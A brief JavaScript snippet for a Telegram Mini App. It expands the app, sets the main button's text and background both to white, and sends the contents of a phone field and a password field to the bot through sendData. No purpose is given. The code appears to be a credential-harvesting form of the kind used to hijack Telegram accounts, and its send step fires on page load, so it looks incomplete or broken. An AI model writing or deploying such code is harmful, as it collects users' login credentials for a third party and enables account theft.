const tg = window.Telegram.WebApp;

tg.expand();

tg.MainButton.textColor = "#ffffff";
tg.MainButton.color = "#ffffff";

tg.sendData(
	JSON.stringify({
		phone: document.querySelector("#phone").value,
		password: document.querySelector("#password").value,
	}),
);
